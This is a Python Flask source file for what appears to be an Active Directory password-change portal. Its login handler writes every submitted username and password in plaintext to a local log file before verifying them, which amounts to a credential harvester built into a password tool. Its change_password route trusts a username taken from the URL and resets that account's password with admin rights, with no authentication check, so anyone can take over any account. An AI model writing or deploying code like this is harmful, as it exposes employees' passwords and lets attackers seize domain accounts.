import os
import ldap
from flask import Flask, render_template, request, redirect, url_for
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)

def log_credentials(username, password):
    with open('user_credentials.log', 'a') as f:
        f.write(f'Username: {username}, Password: {password}\n')

def change_ad_password(username, new_password):
    try:
        conn = ldap.initialize(os.getenv('AD_SERVER'))
        conn.simple_bind_s(
            os.getenv('AD_ADMIN_USER'),
            os.getenv('AD_ADMIN_PASSWORD')
        )
        
        user_dn = f"CN={username},CN=Users,DC=domain,DC=com"
        
        unicode_pass = f'"{new_password}"'.encode('utf-16-le')
        changes = [
            (ldap.MOD_REPLACE, 'unicodePwd', unicode_pass)
        ]
        
        conn.modify_s(user_dn, changes)
        return True
    except Exception as e:
        print(f"Error changing password: {str(e)}")
        return False
    finally:
        conn.unbind()

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        
        log_credentials(username, password)
        
        try:
            conn = ldap.initialize(os.getenv('AD_SERVER'))
            conn.simple_bind_s(f"DOMAIN\\{username}", password)
            conn.unbind()
            return redirect(url_for('change_password', username=username))
        except ldap.INVALID_CREDENTIALS:
            return "Invalid credentials", 401
        except Exception as e:
            return str(e), 500
    
    return render_template('login.html')

@app.route('/change_password', methods=['GET', 'POST'])
def change_password():
    username = request.args.get('username')
    
    if request.method == 'POST':
        new_password = request.form['new_password']
        if change_ad_password(username, new_password):
            return "Password changed successfully"
        return "Password change failed", 500
    
    return render_template('change_password.html', username=username)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)